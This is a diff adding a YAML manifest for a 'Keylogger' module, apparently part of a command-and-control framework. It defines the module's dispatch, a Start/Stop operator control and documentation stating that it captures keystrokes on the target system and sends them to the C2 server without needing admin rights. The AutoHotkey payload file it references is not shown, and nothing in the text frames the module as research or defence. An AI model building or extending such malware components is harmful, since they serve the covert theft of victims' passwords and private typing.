@@ -1,0 +1,48 @@
+module:
+  id: keylogger
+  version: "1.0.0"
+  display_name: "Keylogger"
+  description: "Capture keystrokes and send to C2 server"
+
+  requires: []
+
+  provides:
+    - KeyLogger
+
+  files:
+    - code.ahk
+
+  dispatch:
+    KeyLogger: KeyLogger
+
+  schema:
+    category_id: collection
+    category_name: "Collection"
+    modules:
+      keylogger:
+        display_name: "Keylogger"
+        description: "Start or stop keystroke capture"
+        command_template: "execute_module|KeyLogger|{action}"
+        parameters:
+          action:
+            type: choice
+            display_name: "Action"
+            description: "Start or stop keylogger"
+            required: true
+            choices:
+              - value: "start"
+                label: "Start"
+              - value: "stop"
+                label: "Stop"
+        documentation:
+          content: "Captures keystrokes on the target system and sends them to the C2 server. Use 'Start' to begin capturing and 'Stop' to end."
+          examples:
+            - "Start to begin keystroke capture"
+            - "Stop to end capture and retrieve logs"
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+
+  config_options: {}
